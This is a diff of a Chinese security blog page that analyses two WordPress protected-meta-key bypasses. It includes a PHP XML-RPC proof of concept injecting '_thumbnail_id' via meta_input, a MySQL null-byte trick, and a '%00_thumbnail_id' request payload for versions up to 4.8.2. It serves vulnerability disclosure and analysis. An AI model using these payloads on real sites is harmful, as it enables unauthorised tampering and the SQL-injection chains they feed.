@@ -14,7 +14,7 @@
 <meta property="og:description" content="作者：Ambulong@vulspy Wordpress中的POST META为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。 （该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。） 自定义栏目/字段的数据以meta_key（">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://blog.vulspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/1.2.1.png">
-<meta property="og:updated_time" content="2017-09-07T06:26:29.824Z">
+<meta property="og:updated_time" content="2017-11-09T10:55:51.206Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Wordpress POST META_NAME校验绕过">
 <meta name="twitter:description" content="作者：Ambulong@vulspy Wordpress中的POST META为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。 （该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。） 自定义栏目/字段的数据以meta_key（">
@@ -104,7 +104,7 @@
 <p><em>（该操作的位置在<code>添加/编辑文章</code>，在文本编辑框下方的<code>自定义栏目</code>，如果没有找到<code>自定义栏目</code>，需要在右上角的<code>显示选项</code>内将<code>自定义栏目</code>勾选。）</em></p>
 <p><code>自定义栏目/字段</code>的数据以<code>meta_key</code>（字段/栏目名）-&gt;<code>meta_value</code>（值）的形式存放在<code>wp_postmeta</code>表内。以<code>下划线</code>开头的<code>meta_key</code>（字段/栏目名）被认为是保留字段，不允许用户添加。</p>
 <p>本文将介绍如何绕过Wordpress的<code>meta_key</code>检查，添加字段/栏目名以<code>下划线</code>开头的<code>自定义栏目/字段</code>。</p>
-<h2 id="第一章-Wordpress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#第一章-Wordpress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞"></a>第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</h2><p>参考内容：<a href="(https://wordpress.org/news/2017/05/wordpress-4-7-5/">WordPress 4.7.5 Security and Maintenance Release</a>)</p>
+<h2 id="第一章-Wordpress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#第一章-Wordpress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞"></a>第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</h2><p>参考内容：<a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">WordPress 4.7.5 Security and Maintenance Release</a></p>
 <h3 id="1-1-POC"><a href="#1-1-POC" class="headerlink" title="1.1 POC"></a>1.1 POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$usr = <span class="string">'author'</span>;</div><div class="line">$pwd = <span class="string">'author'</span>;</div><div class="line">$xmlrpc = <span class="string">'http://local.target/xmlrpc.php'</span>;</div><div class="line">$client = <span class="keyword">new</span> IXR_Client($xmlrpc);</div><div class="line">$content = <span class="keyword">array</span>(<span class="string">"ID"</span> =&gt; <span class="number">6</span>, <span class="string">'meta_input'</span> =&gt; <span class="keyword">array</span>(<span class="string">"_thumbnail_id"</span>=&gt;<span class="string">"xxx"</span>));</div><div class="line">$res = $client-&gt;query(<span class="string">'wp.editPost'</span>,<span class="number">0</span>, $usr, $pwd, <span class="number">6</span><span class="comment">/*post_id*/</span>, $content);</div></pre></td></tr></table></figure>
 <p>POC来自 <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">Wordpress SQLi — PoC by slavco</a></p>
 <h3 id="1-2-漏洞分析"><a href="#1-2-漏洞分析" class="headerlink" title="1.2 漏洞分析"></a>1.2 漏洞分析</h3><p><strong>补丁位置：<a href="https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4#diff-6a81e4b18bb9bfe1f02588ddc35d801b" target="_blank" rel="external">wp-includes/class-wp-xmlrpc-server.php</a> </strong></p>
@@ -116,6 +116,16 @@
 <p>但是在wp_update_post函数与wp_insert_post函数中，会从$post_data[‘meta_input’]中取出数据，不经检查直接添加到<code>自定义栏目/字段</code>中。</p>
 <p>2.函数wp_insert_post中我们关注的代码（文件：<a href="https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L2974" target="_blank" rel="external">wp-includes/post.php</a>）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_insert_post</span><span class="params">( $postarr, $wp_error = false )</span> </span>&#123;</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	$postarr = wp_parse_args($postarr, $defaults);</div><div class="line">	<span class="keyword">unset</span>( $postarr[ <span class="string">'filter'</span> ] );</div><div class="line">	$postarr = sanitize_post($postarr, <span class="string">'db'</span>);</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'meta_input'</span>] ) ) &#123;</div><div class="line">		<span class="keyword">foreach</span> ( $postarr[<span class="string">'meta_input'</span>] <span class="keyword">as</span> $field =&gt; $value ) &#123;</div><div class="line">			update_post_meta( $post_ID, $field, $value );</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="第二章-Wordpress-≤-4-8-2-POST-META-校验绕过漏洞"><a href="#第二章-Wordpress-≤-4-8-2-POST-META-校验绕过漏洞" class="headerlink" title="第二章 Wordpress ≤ 4.8.2 POST META 校验绕过漏洞"></a>第二章 Wordpress ≤ 4.8.2 POST META 校验绕过漏洞</h2><p><strong>该章节更新时间：2017年11月09日</strong></p>
+<p>吐槽：该缺陷于9月初<a href="https://hackerone.com/reports/265484" target="_blank" rel="external">报告</a>给WP Team，然而2个多月过去了仍然只有9月5号的一条回复。:(</p>
+<p>Wordpress目前最新版为4.8.3，建议大家更新。</p>
+<h3 id="2-1-一个MySQL的trick"><a href="#2-1-一个MySQL的trick" class="headerlink" title="2.1 一个MySQL的trick"></a>2.1 一个MySQL的trick</h3><p>1). 正常的条件查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>2). 现在我们将_thumbnail_id修改成”\x00_thumbnail_id”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
+<p>3). 再次执行第一步的查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>我们可以发现依然可以查询出修改后的数据。</p>
+<h3 id="2-2-POST-META-校验绕过"><a href="#2-2-POST-META-校验绕过" class="headerlink" title="2.2 POST META 校验绕过"></a>2.2 POST META 校验绕过</h3><p>我们来看下检查<code>meta_key</code>的代码，文件<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920" target="_blank" rel="external">./wp-includes/meta.php</a>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_protected_meta</span><span class="params">( $meta_key, $meta_type = null )</span> </span>&#123;</div><div class="line">    $protected = ( <span class="string">'_'</span> == $meta_key[<span class="number">0</span>] );</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * Filters whether a meta key is protected.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@since</span>](/since) 3.2.0</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) bool   $protected Whether the key is protected. Default false.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_key  Meta key.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_type Meta type.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">return</span> apply_filters( <span class="string">'is_protected_meta'</span>, $protected, $meta_key, $meta_type );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>is_protected_meta</code>函数只检查了<code>$meta_key</code>的第一个字符是否以<code>_</code>开头。我们有了2.1的MySQL trick，想要绕过<code>meta_key</code>的检查就显得容易多了。</p>
+<h3 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h3><p>在添加<code>自定义栏目/字段</code>时抓包，将_thumbnail_id替换为%00_thumbnail_id。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
 <li>WordPress 4.7.5 Security and Maintenance Release - <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a></li>
 <li>Wordpress SQLi — PoC by slavco - <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</a></li>
@@ -124,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cj9cubsrf0007zxpvchtu18m6" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cj9y5qhhd0003lqpvgulqyd8d" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -134,6 +144,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Wordpress &lt;= 4.8.2 SQL Injection POC
+        
+      </div>
+    </a>
   
   
     <a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" id="article-nav-older" class="article-nav-link-wrap">
@@ -167,7 +186,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
     </div>
   </div>
 
@@ -178,6 +197,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
+          </li>
         
           <li>
             <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a>
@@ -195,10 +218,6 @@
             <a href="/2017/08/12/SSRF-And-URL-Related-TIPS/">SSRF And URL Related TIPS</a>
           </li>
         
-          <li>
-            <a href="/2017/08/02/Local-Privilege-Escalation-Tips/">Local Privilege Escalation Tips</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -211,11 +230,12 @@
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2017 Ambulong<br>
+      &copy; 2017 <a href="mailto:zeng.ambulong@gmail.com">Ambulong</a><br>
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
+
     </div>
     <nav id="mobile-nav">
   
